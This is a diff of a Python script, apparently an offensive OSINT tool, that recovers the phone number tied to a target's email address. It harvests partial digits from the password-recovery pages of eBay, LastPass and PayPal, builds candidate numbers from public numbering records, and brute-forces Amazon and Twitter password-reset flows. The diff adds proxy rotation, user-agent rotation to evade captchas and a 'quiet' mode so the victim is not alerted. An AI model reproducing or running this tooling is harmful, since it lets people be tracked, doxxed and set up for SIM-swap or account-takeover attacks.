@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 import argparse
 import requests
 import re
@@ -9,11 +11,14 @@ import multiprocessing
 import random
 import urllib
 from itertools import product
+from bs4 import BeautifulSoup
 
 GREEN = '\033[92m'
 YELLOW = '\033[93m'
 RED = '\033[91m'
 ENDC = '\033[0m'
+
+requests.packages.urllib3.disable_warnings()
 
 userAgents = [	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
 				"Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3417; U; en) Presto/2.8.119 Version/11.10",
@@ -24,17 +29,13 @@ userAgents = [	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH
 				"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
 				"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"]
 
-victimNumber = ['X','X','X','X','X','X','X','X','X','X']
-
-#proxy = {"https": "127.0.0.1:8080"}
-proxy = False
-verifyProxy = True
+proxyList = []
+verifyProxy = False
 
 
 
 ############ BRUTEFORCERS ############
 def startBruteforcing(phoneNumbers, victimEmail, quietMode, verbose):
-	print "Starting bruteforce..."
 	if quietMode:
 		getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose)
 	else:
@@ -44,10 +45,15 @@ def startBruteforcing(phoneNumbers, victimEmail, quietMode, verbose):
 # Uses Amazon to obtain masked email by resetting passwords using phone numbers
 def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 	global userAgents
+	global proxyList
+
 	emailRegex = "[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"
+	possibleNumberFound = False
 
 	for phoneNumber in phoneNumbers:
 		userAgent = random.choice(userAgents) # Pick random user agents to help prevent captchas
+		proxy = random.choice(proxyList)
+
 		session = requests.Session()
 		response = session.get("https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
 			headers = {"User-Agent": userAgent,
@@ -64,9 +70,9 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 		workflowState = re.search('name="workflowState" value="(.*)"', response.text).group(1)
 		appActionToken = re.search('name="appActionToken" value="(.*)" /><input', response.text).group(1)
 
-		csmhitCookie = {"version":0,"name":'csm-hit',"value":'tb:B79Q924JBYC22JBPZBPY+s-B79Q924JBYC22JBPZBPY|1555913752789&t:1555913752789&adb:adblk_no',"port":None,"domain":'www.amazon.com'}#,"path":'/',secure":False,"expires":None,"discard":True,"comment":None,"comment_url":None,"rest":{},"rfc2109":False}
+		csmhitCookie = {"version":0,"name":'csm-hit',"value":'tb:B79Q924JBYC22JBPZBPY+s-B79Q924JBYC22JBPZBPY|1555913752789&t:1555913752789&adb:adblk_no',"port":None,"domain":'www.amazon.com'}
 		session.cookies.set(**csmhitCookie)
-		response = session.post("https://www.amazon.com/ap/forgotpassword/",# + sessionId,
+		response = session.post("https://www.amazon.com/ap/forgotpassword/",
 			headers = {"Cache-Control": "max-age=0",
 						"Origin": "https://www.amazon.com",
 						"Upgrade-Insecure-Requests": "1",
@@ -116,6 +122,7 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 					proxies = proxy,
 					verify = verifyProxy)
 
+
 		if response.status_code >= 500: # Error, let's try again
 			print YELLOW + "WARNING: 500 error returned for phone: " + phoneNumber + ENDC
 			continue
@@ -129,7 +136,7 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 			continue
 
 		elif "Enter the characters above" in response.text:
-			if verbose: print YELLOW + "Captcha caught us trying number: " + phoneNumber + ENDC #+ "-------- \n"+response.text+"\n------------------"
+			if verbose: print YELLOW + "Captcha caught us trying number: " + phoneNumber + ENDC
 			continue
 
 		elif "Set a new password" in response.text: # Deal with multiple option
@@ -156,6 +163,7 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 			maskedEmail = re.search(emailRegex, response.text).group(0)		
 			if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[victimEmail.find('@')-1 : ] == maskedEmail[maskedEmail.find('@')-1 : ]:
 				print GREEN + "Possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC
+				possibleNumberFound = True
 			else:
 				if verbose: print YELLOW + "No match for email: " + maskedEmail + " and number: " + phoneNumber + ENDC
 
@@ -163,6 +171,7 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 			maskedEmail = re.search(emailRegex, response.text).group(0)
 			if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[victimEmail.find('@')-1 : ] == maskedEmail[maskedEmail.find('@')-1 : ]:
 				print GREEN + "Possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC
+				possibleNumberFound = True
 			else:
 				if verbose: print YELLOW + "No match for email: " + maskedEmail + " and number: "+ phoneNumber + ENDC
 		else:
@@ -170,14 +179,24 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 			if verbose: print RED + response.text + ENDC
 			exit("Unknown error!")
 
+	if not possibleNumberFound:
+		print RED + "Couldn't find a phone number associated to " + args.email + ENDC
+
+
+
 
 # Uses Amazon to obtain masked email by resetting passwords using phone numbers
 def getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose):
 	global userAgents
+	global proxyList
+
+	possibleNumberFound = False
 	emailRegex = "[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"
 
 	for phoneNumber in phoneNumbers:
 		userAgent = random.choice(userAgents) # Pick random user agents to help prevent captchas
+		proxy = random.choice(proxyList)
+
 		session = requests.Session()
 		response = session.get("https://twitter.com/account/begin_password_reset",
 			headers = {"Accept": "application/json, text/javascript, */*; q=0.01",
@@ -242,11 +261,15 @@ def getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose):
 			maskedEmail = regexOutput.group(1)
 			if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[1] == maskedEmail[1] and victimEmail[victimEmail.find('@')+1 : victimEmail.find('@')+2] == maskedEmail[maskedEmail.find('@')+1 : maskedEmail.find('@')+2]:
 				print GREEN + "Twitter found that the possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC
+				possibleNumberFound = True
 			else:
 				if verbose: print YELLOW + "Twitter did not find a match for email: " + maskedEmail + " and number: "+ phoneNumber + ENDC
 		else:
 			if verbose: print YELLOW + "Twitter did not display a masked email for number: " + phoneNumber + ENDC
 			continue
+
+	if not possibleNumberFound:
+		print RED + "Couldn't find a phone number associated to " + args.email + ENDC
 
 
 
@@ -256,20 +279,21 @@ def getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose):
 def startScraping(email, quietMode):
 	print "Starting scraping online services..."
 	if quietMode:
-		scrapeEbay(email)
-		#scrapePaypal(email)
+		scrapePaypal(email)
 	else:
 		scrapeEbay(email)
-		#scrapePaypal(email)
 		scrapeLastpass(email)
+		#scrapePaypal(email)
 
 
 def scrapeLastpass(email):
-	global victimNumber
 	global userAgents
+	global proxyList
 	
 	print "Scraping Lastpass..."
 	userAgent = random.choice(userAgents)
+	proxy = random.choice(proxyList)
+
 	session = requests.Session()
 	response = session.get("https://lastpass.com/recover.php",
 				headers = {"Upgrade-Insecure-Requests": "1",
@@ -301,22 +325,18 @@ def scrapeLastpass(email):
 				verify = verifyProxy)
 
 
-	last4 = ""
-	regexOutput = re.search("We sent an SMS with a verification code to .*>(\+?)(.+([0-9]{4}))<\/strong>", response.text)
+	last2 = ""
+	regexOutput = re.search("We sent an SMS with a verification code to .*>(\+?)(.+([0-9]{2}))<\/strong>", response.text)
 	if regexOutput and regexOutput.group(3):
-		last4 = regexOutput.group(3)
-		print GREEN + "Lastpass reports that the last 4 digits are: " + last4 + ENDC
-		if victimNumber[6] == 'X': victimNumber[6] = last4[0]
-		if victimNumber[7] == 'X': victimNumber[7] = last4[1]
-		if victimNumber[8] == 'X': victimNumber[8] = last4[2]
-		if victimNumber[9] == 'X': victimNumber[9] = last4[3]
+		last2 = regexOutput.group(3)
+		print GREEN + "Lastpass reports that the last 2 digits are: " + last2 + ENDC
 
 		if regexOutput.group(1):
 			print GREEN + "Lastpass reports a non US phone number" + ENDC
-			print GREEN + "Lastpass reports that the length of the phone number (including country code) is " + len(regexOutput.group(2)) + " digits" + ENDC
+			print GREEN + "Lastpass reports that the length of the phone number (including country code) is " + str(len(regexOutput.group(2).replace("-",""))) + " digits" + ENDC
 		else:
 			print GREEN + "Lastpass reports a US phone number" + ENDC
-			print GREEN + "Lastpass reports that the length of the phone number (without country code) is " + len(regexOutput.group(2)) + " digits" + ENDC
+			print GREEN + "Lastpass reports that the length of the phone number (without country code) is " + str(len(regexOutput.group(2).replace("-",""))) + " digits" + ENDC
 	else:
 		print YELLOW + "Lastpass did not report any digits" + ENDC
 
@@ -324,13 +344,14 @@ def scrapeLastpass(email):
 
 
 def scrapeEbay(email):
-	global victimNumber
 	global userAgents
-	
+	global proxyList
+
 	print "Scraping Ebay..."
 	userAgent = random.choice(userAgents)
-	session = requests.Session()
+	proxy = random.choice(proxyList)
 
+	session = requests.Session()
 	response = session.get("https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
 				headers = {"Upgrade-Insecure-Requests": "1",
 							"User-Agent": userAgent,
@@ -381,27 +402,23 @@ def scrapeEbay(email):
 		if regexOutput.group(1):
 			first3 = regexOutput.group(1)
 			print GREEN + "Ebay reports that the first 3 digits are: " + first3 + ENDC
-			if victimNumber[0] == 'X': victimNumber[0] = first3[0]
-			if victimNumber[1] == 'X': victimNumber[1] = first3[1]
-			if victimNumber[2] == 'X': victimNumber[2] = first3[2]
 		if regexOutput.group(2):
 			last2 = regexOutput.group(2)
 			print GREEN + "Ebay reports that the last 2 digits are: " + last2 + ENDC
-			if victimNumber[8] == 'X': victimNumber[8] = last2[0]
-			if victimNumber[9] == 'X': victimNumber[9] = last2[1]
 	else:
 		print YELLOW + "Ebay did not report any digits" + ENDC
 
 
 
 def scrapePaypal(email):
-	global victimNumber
 	global userAgents
+	global proxyList
 
 	print "Scraping Paypal..."
 	userAgent = random.choice(userAgents)
-	session = requests.Session()
+	proxy = random.choice(proxyList)
 
+	session = requests.Session()
 	response = session.get("https://www.paypal.com/authflow/password-recovery/",
 				headers = {"Upgrade-Insecure-Requests": "1",
 							"User-Agent": userAgent,
@@ -427,7 +444,6 @@ def scrapePaypal(email):
 							"Origin": "https://www.paypal.com",
 							"X-Requested-With": "XMLHttpRequest",
 							"User-Agent": userAgent,
-							#"Content-Type": "application/json",
 							"Accept": "*/*",
 							"Referer": "https://www.paypal.com/authflow/password-recovery/",
 							"Accept-Encoding": "gzip, deflate",
@@ -493,7 +509,7 @@ def scrapePaypal(email):
 							"Accept-Encoding": "gzip, deflate",
 							"Accept-Language": "en-US,en;q=0.9",
 				},
-				proxies = proxy,
+				proxies = proxyList,
 				verify = verifyProxy)
 
 	lastDigits = ""
@@ -501,10 +517,6 @@ def scrapePaypal(email):
 	if regexOutput and regexOutput.group(3):
 		last4 = regexOutput.group(3)
 		print GREEN + "Pyapal reports that the last " + len(regexOutput.group(3)) + " digits are: " + lastDigits + ENDC
-		if victimNumber[6] == 'X': victimNumber[6] = last4[0]
-		if victimNumber[7] == 'X': victimNumber[7] = last4[1]
-		if victimNumber[8] == 'X': victimNumber[8] = last4[2]
-		if victimNumber[9] == 'X': victimNumber[9] = last4[3]
 
 		if regexOutput.group(2):
 			firstDigit = regexOutput.group(2)
@@ -519,7 +531,10 @@ def scrapePaypal(email):
 
 
 
-# Returns all possible phone numbers according to NANPA based on a partial phone number
+
+############ GENERATORS ############
+
+# Returns all possible valid phone numbers according to NANPA based on a partial phone number
 def getPossiblePhoneNumbers(maskedPhone):
 	possiblePhoneNumbers = []
 	nanpaFileUrl = "https://www.nationalnanpa.com/nanp1/allutlzd.zip"
@@ -535,17 +550,74 @@ def getPossiblePhoneNumbers(maskedPhone):
 	archive = zipfile.ZipFile('./allutlzd.zip', 'r')
 	file = archive.read('allutlzd.txt')
 
-	partialRegex = re.sub("X", "[0-9]{1}", "(" + maskedPhone[:3] + "-" + maskedPhone[3:6] + ")") # construct area code + exchange regex
-	possibleAreacodeExchanges = re.findall("[A-Z]{2}\s\t" + partialRegex, file)
+	assignedRegex = '\s[0-9A-Z\s]{4}\t.*\t[A-Z\-\s]+\t[0-9\\]*[\t\s]+AS' # Only assigned area codes and exchanges
+	areacodeExchangeRegex = re.sub("X", "[0-9]{1}", "(" + maskedPhone[:3] + "-" + maskedPhone[3:6] + ")") # Area code + exchange 
+	possibleAreacodeExchanges = re.findall("([A-Z]{2})\s\t" + areacodeExchangeRegex + assignedRegex, file) # Format: [state, areacode-exchange]
 
-	# Calculate missing 4 digits
-	remainingX = maskedPhone[6:].count("X")
-	maskedPhoneFormatted = maskedPhone[6:].replace("X","{}")
+	remainingX = maskedPhone[7:].count("X")
+	maskedPhoneFormatted = maskedPhone[7:].replace("X","{}")
 	for possibleAreacodeExchange in possibleAreacodeExchanges:
-		for x in product("0123456789", repeat=remainingX):
-			possiblePhoneNumbers.append(possibleAreacodeExchange[:3] + possibleAreacodeExchange[4:] + maskedPhoneFormatted.format(*x))
+		if maskedPhone[6] == 'X': # Check for available block numbers for that area code and exchange
+			blockNumbers = getValidBlockNumbers(possibleAreacodeExchange[0], possibleAreacodeExchange[1].split("-")[0], possibleAreacodeExchange[1].split("-")[1])
+		else:
+			blockNumbers = [maskedPhone[6]]
+		
+		for blockNumber in blockNumbers: # Add the rest of random subscriber number digits
+			for x in product("0123456789", repeat=remainingX):
+				possiblePhoneNumbers.append(possibleAreacodeExchange[1][:3] + possibleAreacodeExchange[1][4:] + blockNumber + maskedPhoneFormatted.format(*x))
 
 	return possiblePhoneNumbers
+
+
+
+def getValidBlockNumbers(state, areacode, exchange):
+	global userAgents
+	global proxyList
+
+	session = requests.Session()
+	session.get("https://www.nationalpooling.com/pas/blockReportSelect.do?reloadModel=N") # We need the cookies or it will error
+	response  = session.post("https://www.nationalpooling.com/pas/blockReportDisplay.do",
+					headers = {"Upgrade-Insecure-Requests": "1",
+							"User-Agent": random.choice(userAgents),
+							"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+							"Referer": "https://www.nationalpooling.com/pas/blockReportSelect.do?reloadModel=Y",
+							"Accept-Encoding": "gzip, deflate, br",
+							"Accept-Language": "en-US,en;q=0.9,es;q=0.8",
+							"Origin": "https://www.nationalpooling.com",
+							"Content-Type": "application/x-www-form-urlencoded",
+							"DNT": "1"
+					},
+					data = "stateAbbr=" + state +
+						"&npaId=" + areacode +
+						"&rtCntrId=" + "ALL" +
+						"&reportType=" + "3",
+					proxies = random.choice(proxyList),
+					verify = verifyProxy)
+
+	soup = BeautifulSoup(response.text, 'html.parser')
+	availableBlockNumbers = []
+	areacodeCells = soup.select("form table td:nth-of-type(1)")
+	for areaCodeCell in areacodeCells:
+		if areaCodeCell.string and areaCodeCell.string.strip() == areacode:
+			exhangeCell = areaCodeCell.next_sibling.next_sibling
+			if exhangeCell.string and exhangeCell.string.strip() == exchange:
+				blockNumberCell = exhangeCell.next_sibling.next_sibling
+				availableBlockNumbers.append(blockNumberCell.string.strip())
+
+	return [n for n in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"] if n not in availableBlockNumbers] # return block numbers that are NOT available
+
+
+
+def setProxyList(fileHandler):
+	global proxyList
+
+	fileContent = f.read()
+	fileContent = filter(None, fileContent) # Remove last \n if needed
+	proxyListUnformatted = fileContent.split("\n")
+
+	for proxyUnformatted in proxyListUnformatted:
+		separatorPosition = proxyUnformatted.find("://")
+		proxyList.append({proxyUnformatted[:separatorPosition]: proxyUnformatted[separatorPosition+3:]})
 
 
 
@@ -554,43 +626,44 @@ def getPossiblePhoneNumbers(maskedPhone):
 parser = argparse.ArgumentParser(description='An OSINT tool to find phone numbers associated to email addresses')
 subparsers = parser.add_subparsers(help='commands')
 
-allin_parser = subparsers.add_parser('allin', help='automate the entire process')
-allin_parser.add_argument("-e", required=True, metavar="EMAIL", dest="email", help="Victim's email address")
-allin_parser.add_argument("-q", dest="quiet", action="store_true", help="only scrape services that do not alert the victim")
-
 scrape_parser = subparsers.add_parser('scrape', help='scrape online services for phone number digits')
 scrape_parser.add_argument("-e", required=True, metavar="EMAIL", dest="email", help="victim's email address")
+scrape_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies", help="a file with a list of https proxies to use. Format: https://127.0.0.1:8080")
 scrape_parser.add_argument("-q", dest="quiet", action="store_true", help="scrape services that do not alert the victim")
 
-generator_parser = subparsers.add_parser('generate', help='generate all possible/valid phone numbers')
-generator_parser.add_argument("-m", required=True, metavar="MASK", dest="mask", help="a masked 10-digit US phone number as in: 55X55X5XX5")
+generator_parser = subparsers.add_parser('generate', help="generate all valid phone numbers based on NANPA's public records")
+generator_parser.add_argument("-m", required=True, metavar="MASK", dest="mask", help="a masked 10-digit US phone number as in: 555XXX1234")
 generator_parser.add_argument("-o", metavar="FILE", dest="file", help="outputs the list to a dictionary")
+generator_parser.add_argument("-q", dest="quiet", action="store_true", help="use services that do not alert the victim")
+generator_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies", help="a file with a list of https proxies to use. Format: https://127.0.0.1:8080")
 
-bruteforce_parser = subparsers.add_parser('bruteforce', help='bruteforce valid phone number using Amazon')
-bruteforce_parser.add_argument("-m", required=True, metavar="MASK", dest="mask", help="a masked 10-digit US phone number as in: 55X55X5XX5")
+bruteforce_parser = subparsers.add_parser('bruteforce', help='bruteforce using online services to find the phone number')
 bruteforce_parser.add_argument("-e", required=True, metavar="EMAIL", dest="email", help="victim's email address")
-bruteforce_parser.add_argument("-q", dest="quiet", action="store_true", help="bruteforce using services that do not alert the victim")
+bruteforce_parser.add_argument("-m", metavar="MASK", dest="mask", help="a masked, 10-digit US phone number as in: 555XXX1234")
+bruteforce_parser.add_argument("-d", metavar="DICTIONARY", dest="file", help="a file with a list of numbers to try")
+bruteforce_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies", help="a file with a list of HTTPS proxies to use. Format: https://127.0.0.1:8080")
+bruteforce_parser.add_argument("-q", dest="quiet", action="store_true", help="use services that do not alert the victim")
 bruteforce_parser.add_argument("-v", dest="verbose", action="store_true", help="verbose output")
-
 
 args = parser.parse_args()
 vars(args)["action"] = sys.argv[1] # Add missing param
 
+if args.action=="scrape":
+	if args.proxies:
+		f = open(args.proxies, "r")
+		if not f.mode == 'r': exit(RED + "Could not read file " + args.proxies + ENDC)
+		setProxyList(f)
 
-if args.action=="allin":
-	print "Let's get the phone number associated to " + args.email + "..."
 	startScraping(args.email, args.quiet)
-
-	print GREEN + "Victim's number associated to " + args.email + " is " + ''.join(victimNumber) + ENDC
-
-elif args.action=="scrape":
-	startScraping(args.email, args.quiet)
-	###print GREEN + "Victim's number associated to " + args.email + " is " + ''.join(victimNumber) + ENDC
-	###print "Finished scraping!"
 
 elif args.action=="generate":
 	if not re.match("^[0-9X]{10}", args.mask):
-		exit(RED + "You need to pass a US phone number masked as in: 55X55X5XX5" + ENDC)
+		exit(RED + "You need to pass a US phone number masked as in: 555XXX1234" + ENDC)
+
+	if args.proxies:
+		f = open(args.proxies, "r")
+		if not f.mode == 'r': exit(RED + "Could not read file " + args.proxies + ENDC)
+		setProxyList(f)
 
 	possiblePhoneNumbers = getPossiblePhoneNumbers(args.mask)
 	if args.file:
@@ -603,33 +676,47 @@ elif args.action=="generate":
 		print GREEN + str(possiblePhoneNumbers) + ENDC
 
 elif args.action=="bruteforce":
-	if not re.match("^[0-9X]{10}", args.mask):
-		exit(RED + "You need to pass a 10-digit US phone number masked as in: 55X55X5XX5" + ENDC)
 	if args.email and not re.match(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)", args.email):
 		exit(RED + "Email is invalid" + ENDC)
 
+	if (args.mask and args.file) or (not args.mask and not args.file):
+		exit(RED + "You need to provide a masked number or a file with numbers to try" + ENDC)
+
+	if args.mask and not re.match("^[0-9X]{10}", args.mask): exit(RED + "You need to pass a 10-digit US phone number masked as in: 555XXX1234" + ENDC)
+	if args.file and not os.path.isfile(args.file): exit(RED + "You need to pass a valid file path" + ENDC)
+
 	print "Looking for the phone number associated to " + args.email + "..."
-	possiblePhoneNumbers = getPossiblePhoneNumbers(args.mask)
-
-	threadPayloadLen = len(possiblePhoneNumbers)/4
-	print possiblePhoneNumbers
-	p1 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[:threadPayloadLen], args.email, args.quiet, args.verbose,))
-	p2 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen:threadPayloadLen*2], args.email, args.quiet, args.verbose,))
-	p3 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen*2:threadPayloadLen*3], args.email, args.quiet, args.verbose,))
-	p4 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen*3:], args.email, args.quiet, args.verbose,))
-	p1.start()
-	p2.start()
-	p3.start()
-	p4.start()
-	p1.join()
-	p2.join()
-	p3.join()
-	p4.join()
-
-	if ''.join(victimNumber) != "XXXXXXXXXX":
-		print GREEN + "Victim's number associated to " + args.email + " is " + ''.join(victimNumber) + ENDC
+	if args.mask:
+		possiblePhoneNumbers = getPossiblePhoneNumbers(args.mask)
 	else:
-		print RED + "Couldn't find a phone number associated to " + args.email + ENDC
+		f = open(args.file, "r")
+		if not f.mode == 'r': exit(RED + "Could not read file " + args.file + ENDC)
+		fileContent = f.read()
+		fileContent = filter(None, fileContent) # Remove last \n if needed
+		possiblePhoneNumbers = fileContent.split("\n")
+	
+	if args.proxies:
+		f = open(args.proxies, "r")
+		if not f.mode == 'r': exit(RED + "Could not read file " + args.proxies + ENDC)
+		setProxyList(f)
+	
+
+	# threadPayloadLen = len(possiblePhoneNumbers)/4
+	# p1 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[:threadPayloadLen], args.email, args.quiet, args.verbose,))
+	# p2 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen:threadPayloadLen*2], args.email, args.quiet, args.verbose,))
+	# p3 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen*2:threadPayloadLen*3], args.email, args.quiet, args.verbose,))
+	# p4 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen*3:], args.email, args.quiet, args.verbose,))
+	# p1.start()
+	# p2.start()
+	# p3.start()
+	# p4.start()
+	# p1.join()
+	# p2.join()
+	# p3.join()
+	# p4.join()
+
+	startBruteforcing(possiblePhoneNumbers, args.email, args.quiet, args.verbose)
+
 
 else:
 	exit(RED + "action not recognized" + ENDC)
